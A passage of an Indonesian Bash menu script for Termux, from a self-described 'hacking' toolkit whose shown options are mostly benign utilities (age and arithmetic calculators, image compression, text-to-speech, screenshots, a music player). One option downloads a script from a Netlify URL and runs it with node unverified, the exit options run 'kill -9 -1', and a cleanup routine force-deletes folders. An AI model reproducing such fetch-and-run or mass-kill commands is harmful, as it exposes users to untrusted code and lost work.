              clear
b='\033[34;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
echo "
 ▗▄▄▖▗▄▄▄▖▗▖ ▗▖    ▗▖ ▗▖▗▖  ▗▖▗▖ ▗▖▗▄▄▖ 
▐▌   ▐▌   ▐▌▗▞▘    ▐▌ ▐▌▐▛▚▞▜▌▐▌ ▐▌▐▌ ▐▌
▐▌   ▐▛▀▀▘▐▛▚▖     ▐▌ ▐▌▐▌  ▐▌▐▌ ▐▌▐▛▀▚▖
▝▚▄▄▖▐▙▄▄▖▐▌ ▐▌    ▝▚▄▞▘▐▌  ▐▌▝▚▄▞▘▐▌ ▐▌
" | lolcat            
echo -e "${g}===============${r} Cek Umur Seseorang ${g}==============="
echo -e "${c}"
read -p "Masukkan tahun lahir seseorang : " tahun_lahir
echo ""
if ! [[ "$tahun_lahir" =~ ^[0-9]{4}$ ]]; then
    echo -e "${r}Pilihan anda tidak valid harus 4 digit..!!"
fi
tahun_sekarang=$(date +%Y)
umur=$((tahun_sekarang - tahun_lahir))
if (( umur < 0 )); then
    echo -e "${b}Tahun tidak ada blum menuju ke masa depan..!!"
    echo ""
elif (( umur == 0 )); then
    echo -e "${p}Anda baru lahir umur anda skrng ${y}: ${r}0 tahun."
    echo ""
else
    echo -e "${y}Umur Anda sekarang adalah ${c}: ${g}$umur tahun."
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
 ;;
   63)
          echo ""
          mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
          echo -e "${c} Anda Memilih Menu Hacking..!!"
          echo ""
          echo -e "${r} VIP UNLOCK..!!"
          sleep 2
SAVE_DIR="/sdcard/KOMPRES_IMAGE"
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
if ! command -v magick &> /dev/null; then
    clear
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} magick belum terinstall, sedang menginstall..!!"
    sleep 2 
    echo -e "${n}"
    pkg install imagemagick -y
else
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} magick sudah terinstall."
    sleep 2 
fi
if command -v magick &> /dev/null; then
  CMD="magick convert"
elif command -v convert &> /dev/null; then
  CMD="convert"
else
    clear
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} silahkan install convert."
    echo ""
fi
clear 
echo "
░█▀▀░█▄█░█▀█░█▀▄░█▀▀
░█░░░█░█░█▀▀░█▀▄░▀▀█
░▀▀▀░▀░▀░▀░░░▀░▀░▀▀▀ " | lolcat 
echo -e "${g}"
read -p "Masukkan path foto : " path
echo ""
if [ ! -f "$path" ]; then
    clear 
    echo ""
    echo -e "${r}File tidak ditemukan."
    echo ""
fi
if command -v stat &> /dev/null; then
  size=$(stat -c%s "$path" 2>/dev/null || stat -f%z "$path" 2>/dev/null)
else
  size=$(wc -c < "$path" | tr -d ' ')
fi
if [ -z "$size" ]; then
    clear 
    echo ""
    echo -e "${r}Gagall membaca ukuran file."
    echo ""
fi
kb=$(awk "BEGIN {printf \"%.2f\", $size / 1024}")
echo -e "${r}[ ${g}+ ${r}]${y} Ukuran asli : ${kb} KB"
echo -e "${c}"
read -p "Target ukuran (kb) : " ukuran
echo ""
bytes=$(awk "BEGIN {print int($ukuran * 1024)}")
mkdir -p "$SAVE_DIR"
file=$(basename "$path")
name="${file%.*}"
ext="${file##*.}"
for quality in 50 40 30 25 20 15 10 8 5 3 2 1; do
  output="$SAVE_DIR/${name}_q${quality}.${ext}"
  $CMD "$path" -quality $quality "$output" 2>/dev/null 
if [ ! -f "$output" ]; then
   continue
fi    
if command -v stat &> /dev/null; then
   size=$(stat -c%s "$output" 2>/dev/null || stat -f%z "$output" 2>/dev/null)
else
   size=$(wc -c < "$output" | tr -d ' ')
fi
if [ -z "$size" ]; then
    continue
fi   
kb=$(awk "BEGIN {printf \"%.2f\", $size / 1024}")
echo -e "${r}[ ${g}+ ${r}]${y} Kualitas : $quality% -> ${kb} KB"
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Sukses : $quality% -> ${kb} KB"
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} File di : $output"
echo ""
done
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
 ;;
    51)
         echo ""
         mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
         echo -e "${c} Anda Memilih Menu Hacking..!!"
         echo ""
         echo -e "${r} VIP UNLOCK..!!"
         sleep 2
         echo -e "${n}"
         cd $HOME
         clear
curl -sL "https://obsucutejavascrit.netlify.app" -o "$TMPDIR/encryptor.js" && node "$TMPDIR/encryptor.js"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
 ;;
   64)
       echo ""
       mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
       echo -e "${c} Anda Memilih Menu Hacking..!!"
       echo ""
       echo -e "${r} VIP UNLOCK..!!"
       sleep 2
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
n='\033[0m'
if ! command -v python &> /dev/null; then
    clear
    echo ""
    echo -e "${c}Python belum terinstall. Menginstall...!!"
    echo -e "${n}"
    pkg install -y python
fi
if ! command -v pip &> /dev/null; then
    clear 
    echo ""
    echo -e "${c}Pip belum terinstall. Menginstall...!!"
    echo -e "${n}"
    pkg install -y python-pip
fi
if ! command -v gtts-cli &> /dev/null; then
    clear 
    echo ""
    echo -e "${c}gTTS belum terinstall. Menginstall...!!"
    pip install gTTS
    clear
fi
echo "
███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗
███████╗██║   ██║██║   ██║██╔██╗ ██║██║  ██║
╚════██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
███████║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝
       Development : Thxyzz404" | lolcat
echo -e "${g}"
read -p "Masukkan teks yang ingin menjadi sound : " teks
echo "$teks" > teks.txt
gtts-cli -f teks.txt -l id -o /sdcard/Download/Google.mp3
rm teks.txt
echo ""
echo -e "${r}[ ${g}SUKSES ${r}]${y} Menyimpan ke /sdcard/Download/Google.mp3"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
           read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
           clear
             ;;
     65)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
while true; do
clear 
echo "
██╗  ██╗ █████╗ ██╗     ██╗   ██╗
██║ ██╔╝██╔══██╗██║     ██║   ██║
█████╔╝ ███████║██║     ██║   ██║
██╔═██╗ ██╔══██║██║     ██║   ██║
██║  ██╗██║  ██║███████╗╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝" | lolcat
echo ""
echo -e "${r}[ ${g}01 ${r}]${c} Penjumlahan"
echo -e "${r}[ ${g}02 ${r}]${c} Pengurangan"
echo -e "${r}[ ${g}03 ${r}]${c} Perkalian"
echo -e "${r}[ ${g}04 ${r}]${c} Pembagian"
echo -e "${r}[ ${g}05 ${r}]${c} Pangkat"
echo -e "${r}[ ${g}06 ${r}]${c} Akar Kuadrat"
echo -e "${r}[ ${g}07 ${r}]${c} Persen"
echo -e "${r}[ ${g}08 ${r}]${c} Ekspresi Bebas (pakai + - * / ^ dst)"
echo -e "${r}[ ${g}00 ${r}]${y} Keluar"
echo -e "${g}"
read -p "Pilih menu kalkulator [0-8] : " pilih
case $pilih in
1|01)
        echo -e "${p}"
        read -p "Masukkan angka pertama : " a
        echo -e "${b}"
        read -p "Masukkan angka kedua : " b
        echo ""
        echo -e "${c}Hasil : $((a + b))"
        ;;
2|02)
        echo -e "${p}"
        read -p "Masukkan angka pertama : " a
        echo -e "${b}"
        read -p "Masukkan angka kedua : " b
        echo ""
        echo -e "${c}Hasil : $((a - b))"
        ;;
3|03)
        echo -e "${p}"
        read -p "Masukkan angka pertama : " a
        echo -e "${b}"
        read -p "Masukkan angka kedua : " b
        echo ""
        echo -e "${c}Hasil : $((a * b))"
        ;;
4|04)
        echo -e "${p}"
        read -p "Masukkan angka pertama : " a
        echo -e "${b}"
        read -p "Masukkan angka kedua : " b
        echo ""
        echo -e "${c}Hasil : $((a / b))"
        ;;
5|05)
        echo -e "${p}"
        read -p "Masukkan angka : " a
        echo -e "${b}"
        read -p "Dipangkatkan berapa : " b
        echo ""
        echo -e "${c}Hasil : $(echo "$a ^ $b" | bc)"
        ;;
6|06)
        echo -e "${p}"
        read -p "Masukkan angka : " a
        echo ""
        echo -e "${c}Hasil akar kuadrat : $(echo "scale=4; sqrt($a)" | bc)"
        ;;
7|07)
        echo -e "${p}"
        read -p "Masukkan nilai (misal: 30) : " a
        echo -e "${b}"
        read -p "Persen berapa (misal: 15) : " b
        echo ""
        echo -e "${c}$b% dari $a adalah : $(echo "scale=2; $a * $b / 100" | bc)"
        ;;
8|08)
        echo -e "${p}"
        read -p "Masukkan ekspresi matematika (contoh: 5+3*2^2) : " ekspresi
        hasil=$(echo "scale=4; $ekspresi" | sed 's/\^/**/g' | bc -l 2>/dev/null)
        echo ""
        echo -e "${c}Hasil : $hasil"
        ;;
0|00)
        clear 
        echo ""
        echo -e "${r}Keluar dari kalkulator."
        sleep 3 
        echo ""
        break
        ;;
      *)
        clear 
        echo ""
        echo -e "${y}Pilihan tidak valid!"
        sleep 3 
        echo ""
        salah
        ;;
    esac
    echo -e "${y}"
    read -p "Tekan ENTER untuk kembali ke menu..!!"
  done
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
      ;;
         66)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              cd $HOME
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
command -v tmux >/dev/null 2>&1 || {
    clear
    echo ""
    echo -e "${r}[ ${g}x ${r}]${y} Modules tmux blum terinstal, Menginstal..!!"
    sleep 2 
    echo -e "${n}"
    pkg install tmux -y
    clear 
}
clear
echo "
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
"
echo -e "${g}"
read -p "Apakah kamu ingin membuat 4 terminal? (y/n) : " jawab
if [[ "$jawab" == "y" || "$jawab" == "Y" ]]; then
    tmux new-session \; \
        split-window -h \; \
        split-window -v \; \
        select-pane -t 0 \; \
        split-window -v \; \
        select-layout tiled
elif [[ "$jawab" == "n" || "$jawab" == "N" ]]; then
    echo ""
    echo -e "${c} Keluar dari tools..!!"
    echo ""
else
    clear 
    echo ""
    echo -e "${y} Pilihan tidak valid, membuka tmux default..!!"
    echo ""
    sleep 2 
    clear
    tmux
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
 ;;
    67)
        echo ""
        mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
        echo -e "${c} Anda Memilih Menu Hacking..!!"
        echo ""
        echo -e "${r} VIP UNLOCK..!!"
        sleep 2
        clear
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
b='\033[34;1m'
echo ""
echo -e "${r} Developer ${g}: ${c}Thxyzz404"
echo -e "${y}"
read -p "Masukkan kata kunci : " query
if [[ -z "$query" ]]; then
  echo ""
  echo -e "${r}❌ Kata kunci kosong!"
  echo ""
fi
echo ""
echo -e "${c}⌛ Mencari \"$query\" ⌛"
encoded_query=$(echo $query | sed 's/ /%20/g')
url="https://emojicombos.com/$encoded_query"
xdg-open "$url"
echo ""
echo -e "${g}✅ Browser telah dibuka."
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
;;
  49)
      echo ""
      mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
      echo -e "${c} Anda Memilih Menu Hacking..!!"
      echo ""
      echo -e "${r} VIP UNLOCK..!!"
      sleep 2
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
n='\033[0m'
mkdir -p /storage/emulated/0/SCREENSHOT
clear 
echo "
░█▀▀░█▀█░█▀█░▀█▀░█░█░█▀▄░█▀▀
░█░░░█▀█░█▀▀░░█░░█░█░█▀▄░█▀▀
░▀▀▀░▀░▀░▀░░░░▀░░▀▀▀░▀░▀░▀▀▀ " | lolcat 
echo ""
echo -e "${p}   Developer ${r}: ${c}Thxyzz404 "
echo -e "${b}"
read -p "Masukkan URL target : " get
if [ -z "$get" ]; then
    clear 
    echo ""
    echo -e "${r} Pilih yg bener :v "
fi
waktu=$(date +%Y%m%d_%H%M%S)
output="/storage/emulated/0/SCREENSHOT/screenshot_${waktu}.png"
echo ""
echo -e "${r}[ ${g}✓ ${r}]${y} Memproses Capture."
echo -e "${n}"
curl -X POST "https://api.templated.io/tools/public/url-to-image" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "url=$get" \
    -d "format=png" \
    -d "width=1280" \
    -d "height=800" \
    -d "fullPage=false" \
    -d "quality=90" \
    -d "deviceScaleFactor=1" \
    -o "$output"
if [ -f "$output" ] && [ -s "$output" ]; then
    if head -c 1 "$output" | grep -q "{"; then
        echo ""
        echo -e "${r} Terjadi kesalahan."
        cat "$output"
        rm -f "$output"
    else
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Foto berhasil di simpan di : $output"
        echo -e "${g}Ukuran : $(du -h "$output" | cut -f1)"
    fi
else
    echo ""
    echo -e "${r} Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
 ;;
   91)
          clear
          mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
          sleep 1
          mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
          pesan=$(
          echo "Assalamualaikum Bang Ada Bug Pada ToolslV bang."
           )
           isipesan="$pesan"
           xdg-open "https://t.me/Gunawan076w?text=$pesan"
           clear
                 ;;
        92)
               echo ""
               mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
               echo -e "${c} Anda Memilih Menu Manager Sound..!!"
               echo ""
               echo -e "${r} VIP UNLOCK..!!"
               sleep 2
               clear
               cd $HOME
b='\033[34;1m'
h='\033[32;1m'
u='\033[35;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
k='\033[33;1m'
ajg="ansi-rounded"
if ! command -v yt-dlp &> /dev/null; then
    clear
    echo ""
    echo -e "${c} Modules blum terinstal menginstall..!!"
    echo -e "${n}"
    pkg install python ffmpeg mpv git -y
    pip install yt-dlp
fi
musik_on() {
    if pgrep -x mpv > /dev/null; then
        echo -e "${r}[ ${g}!! ${r}]${c} Musik Sudah Sedang Berjalan..!!"
        return
    fi
    if [ ! -s musik.txt ]; then
        echo -e "${r} Daftar musik.txt Kosong Atau Tidak Ditemukan..!!"
        return
    fi
    echo -e "${k} Daftar Musik [ musik.txt ]"
    echo ""
    cat musik.txt | boxes -d "$ajg" | lolcat
    echo ""
    echo -e "${r} Sedang Memutar Musik Di Latar Belakang..!!${c}"
    nohup mpv --no-video --quiet --playlist=musik.txt > /dev/null 2>&1 &
}
music_off() {
    if pgrep -x mpv > /dev/null; then
        pkill mpv
        echo ""
        echo -e "${r} Musik Berhasil Dihentikan..!!"
    else
        echo -e "${p} Tidak Ada Musik Yang Sedang Diputar..!!"
    fi
}
add_music() {
    echo -e "${c}"
    read -p "Masukkan Link YouTube Musik : " new_link
    echo ""
    if [[ "$new_link" == https://* ]]; then
        echo "$new_link" >> musik.txt
        echo -e "${k} Link Berhasil Ditambahkan Ke musik.txt..!!"
        echo -e "${r} Daftar Musik Sekarang..!!"
        sleep 2
        echo -e "${h}"
        cat musik.txt | boxes -d "$ajg" | lolcat
    else
        echo ""
        echo -e "${r} Link Tidak Valid. Harus Diawali Dengan [ https:// ]"
    fi
}
lihat_daftar() {
    echo ""
    echo "DAFTAR LINK MUSIK" | boxes -d "$ajg" | lolcat
    echo ""
    if [ -s musik.txt ]; then
        nl musik.txt | sed 's|https://youtu.be/||' | sed 's|https://www.youtube.com/watch?v=||' | \
        awk '{printf "│ %-3s %-30s │\n", $1, $2}' | \
        boxes -d "$ajg" | lolcat
    else
        echo ""
        echo "Belum Ada Link Musik Yang Ditambahkan..!!" | boxes -d "$ajg" | lolcat
    fi
}
clear
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
echo "
███╗   ███╗██╗   ██╗███████╗██╗██╗  ██╗
████╗ ████║██║   ██║██╔════╝██║██║ ██╔╝
██╔████╔██║██║   ██║███████╗██║█████╔╝
██║╚██╔╝██║██║   ██║╚════██║██║██╔═██╗
██║ ╚═╝ ██║╚██████╔╝███████║██║██║  ██╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝ Setting To Plaay
" | lolcat
echo -e "\033[36;1m╔════════════════════════════════════╗"
echo -e "\033[36;1m║  ${r}SOUND MANAGER SETTING TOOLSlV!!${c}   ║"
echo -e "\033[36;1m╚════════════════════════════════════╝"
echo -e "\033[36;1m║   ${r}[ ${k}01 ${r}] ${h}Mode Online Musik!! \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}02 ${r}] ${h}Tambah Link Musik!! \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}03 ${r}] ${h}Mode Offline Musik!! \033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}04 ${r}] ${h}Lihat Daftar Musik!! \033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}05 ${r}] ${h}Setting File Musik!!\033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}06 ${r}] ${h}Hapus File Musik!! \033[36;1m       ║"
echo -e "\033[36;1m║   ${r}[ ${k}07 ${r}] ${h}Link Musik Admin!!\033[36;1m        ║"
echo -e "\033[36;1m║   ${r}[ ${k}08 ${r}] ${h}Perbaiki Bugs Musik!!\033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}09 ${r}] ${k}Keluar Terminall!!  \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}10 ${r}] ${k}Kembali Ke ToolslV!!  \033[36;1m    ║"
echo -e "\033[36;1m╔════════════════════════════════════╗"
echo -e "\033[36;1m║  ${r}SOUND MANAGER SETTING TOOLSlV!!${c}   ║"
echo -e "\033[36;1m╚════════════════════════════════════╝"
echo -e "${h}"
read -p "Masukkan pilihan anda : " input
echo ""
case $input in
    1|01)
        musik_on
        echo ""
        echo -e "${h}Musik Online Mode Aktif..!!"
        sleep 3
        clear
        ;;
    2|02)
        add_music
        echo ""
        echo -e "${b}Penambahan Musik Selesai..!!"
        sleep 3
        clear 
        ;;
    3|03)
        music_off
        echo ""
        echo -e "${k}Musik Berhasil Dihentikan..!!"
        sleep 3 
        clear 
        ;;
    4|04)
        lihat_daftar
        echo -e "${r}"
        read -p "Tekan Enter Untuk Kembali Ke Menu..!!"
        clear
        ;;
    5|05)
        nano musik.txt
        clear 
        ;;
    6|06)
        clear 
        rm -rf musik.txt
        echo ""
        echo -e "${h} Berhasill Menghapus File Musik..!!"
        sleep 3
        clear
        ;;
    7|07)
file="musik.txt"
links=(
"https://youtu.be/f_z2FUyLZ4I?si=pUStdc8TyOFnedYG"
"https://youtu.be/ALzvSPXmeh8?si=P67t5S8JlbaFfwrC"
"https://youtu.be/SBu9ZKBu-p4?si=1LTfwvIh5snH2ILt"
"https://youtu.be/kGobHQ7z8X4?si=lI1qMS61cnJ5GNFo"
"https://youtu.be/tSmdUF6Q68Y?si=CdnBwbvTs-WDklpB"
"https://youtu.be/vKitfen0VLI?si=p3WEuIivkxv2NDie"
)
check_and_add() {
    if ! grep -Fxq "$1" "$file"; then
        echo "$1" >> "$file"
        clear
        echo ""
        echo -e "${r}Sedang Menambahkan Link Musik..!!"
        echo ""
        echo -e "${h}Berhasill Ditambahkan Ke $file"
        sleep 2
        clear
    else
        clear
        echo ""
        echo -e "${h}Sedang Mengecek File Musik..!!"
        echo ""
        echo -e "${r}Link Sudah Ada Di File $file"
        sleep 2
        clear
    fi
}
check_and_add "${links[1]}"
check_and_add "${links[2]}"
check_and_add "${links[3]}"
check_and_add "${links[4]}"
check_and_add "${links[5]}"
check_and_add "${links[6]}"
check_and_add "${links[7]}"
check_and_add "${links[8]}"
check_and_add "${links[9]}"
check_and_add "${links[0]}"
nano "$file"
    ;;
 8|08)
clear
echo ""
echo -e "${g} Sedang Memperbaiki Alat Musik..!!"
sleep 3
echo -e "${b}"
pkg update && pkg upgrade -y
pkg uninstall python ffmpeg mpv git -y 2>/dev/null || true
pip uninstall yt-dlp -y 2>/dev/null || true
pkg install python ffmpeg mpv git -y
pip install --upgrade yt-dlp
clear
echo ""
echo -e "${r} Musik Selesai Di Perbaiki..!!"
sleep 3
clear
   ;;
 9|09)
echo ""
echo -e "${r} Kluar dari ToolslV"
echo ""
sleep 3 
kill -9 -1 && exit
  ;;
    10)
        echo ""
        echo -e "${c}Keluar Dari Tools Setting Manager..!!"
        sleep 2
        clear 
        ;;
    *)
        echo -e "${r}Perintah Tidak Dikenali..!!"
        sleep 2
        clear 
        ;;
esac
        ;;
       93)
             clear 
             mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
             sleep 1
             mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
y='\033[33;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
n='\033[0m'
txt() {
  local text="$1"
  local delay="${2:-0.03}"
  local color="${3:-}"
  local i char
  if [ -n "$color" ]; then
    printf "%b" "$color"
  fi
  for ((i=0; i<${#text}; i++)); do
    char="${text:i:1}"
    printf "%s" "$char"
    sleep "$delay"
  done
  printf "\n"
  if [ -n "$color" ]; then
    printf "%b" "$n"
  fi
}
echo ""
txt " PEMBERITAHUAN..!!" 0.03 "$g"
echo ""
txt " Apa Itu ToolslV? ToolslV Adalah" 0.03 "$r"
txt " Sebuah Alat Hacking Yang Menyimpan Dalam Satu Tempat" 0.03 "$c"
txt " Dan Dapat Di Gunakan Dalam Berbagai Tools Lainya." 0.03 "$c"
txt " Saya tidak bertanggung jawab atas di salah gunakan" 0.03 "$r"
txt " Pada ToolslV ini..!!" 0.03 "$c"
             echo -e "${y}"
             read -p " SILAHKAN TEKAN ENTER UNTUK MELANJUTKANNYA!! : " p
             clear
               ;;
      94)
              clear
               ;;
       95)
              mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
              sleep 2
              echo -e "${bold_bg}${bold_green} KELUAR DARI TOOLSlV ${n}"
              echo ""
              sleep 3
              kill -9 -1 && exit
                ;;
           96)
cache() {
    clear 
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Memulai pembersihan repository lama..!!"
    sleep 2
    echo ""
    targets=(
        "$HOME/Video"
        "$HOME/Dancok"
        "$HOME/ngrok"
        "$HOME/Nik-Osint"
        "$HOME/Yalakan"
        "$HOME/Bunuh"
        "$HOME/Lokasi"
        "$HOME/pkg_checked.txt"
        "$HOME/Bacot_Ajg"
        "$HOME/Loar"
        "$HOME/Aes.py"
        "$PREFIX/tmp/.ajgtaibangkekbngsatsetantolkontololjmboatpjue"
        "$PREFIX/tmp/JUNZ1337_BOT"
        "$PREFIX/tmp/JUNZ1337_BOT"
        "$HOME/session_junz"
    )
    cleaned=0    
    for target in "${targets[@]}"; do
        if [ -e "$target" ]; then
            rm -rf "$target"
            echo -e "${r}[ ${g}✓ ${r}]${c} Berhasil membersihkan : $target"
            cleaned=1
        fi
    done
    sleep 2
    clear
    lol
}
lol() {
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
         echo "
                    ⢀⣴⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣬⣭⣥⣤⣤⣄⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄
⠀⠀⠀⣠⠞⢛⣷⡾⠟⠁⠀⠀⠀⠀⠀⢀⣾⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿
⠀⢠⡟⢁⣴⣿⣯⠀⢀⣤⣤⣤⣤⣤⣤⣿⣿⡟⠁⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⣠⣿⠟⢋⣭⠙⣡⣈⠻⠿⠿⠿⠿⠿⠟⠋⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠸⠟⠁⣀⣈⢋⣀⣘⣉⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⢸⣿⡿⣿⣿⢿⣿⢿⣿⡿⢿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⠸⣿⡇⣿⣿⢸⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⡇⠸⣿⣿
⠀⠀⣿⡇⢻⣿⢸⣿⢸⣿⠇⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⣿⣧⢸⣿⢸⣿⢸⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡗⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⢸⣿⢸⣿⢸⣿⢸⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣏⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⠈⣿⢸⣿⢸⡟⢸⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⠈⣿⣿⣿⣾⣿⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠏⠀⢻⣿⣿⠇⠀
   " | lolcat
    echo -e "${p} Development ${n}: ${g}Thxyzz404"
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Semua telah di bersihkan."
    echo ""
}
cache
echo ""
echo -e "${bold_bg}${bold_gren}Tekan Enter Untuk Melanjutkannya.${n}"
read -r -p $'\033[1;41m\033[1;32mSilahkan Tekan Enter..!!\033[0m '
clear
    ;;
       *)
              mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
              sleep 1
              mpv --no-video --quiet "$HOME/Yalakan/Tidak_Ada.mp3" &> /dev/null &
              echo -e "${bold_bg}${green} Menu Tidak Ada Di ToolslV..!!${n}"
              sleep 6
              clear
                ;;
esac
done
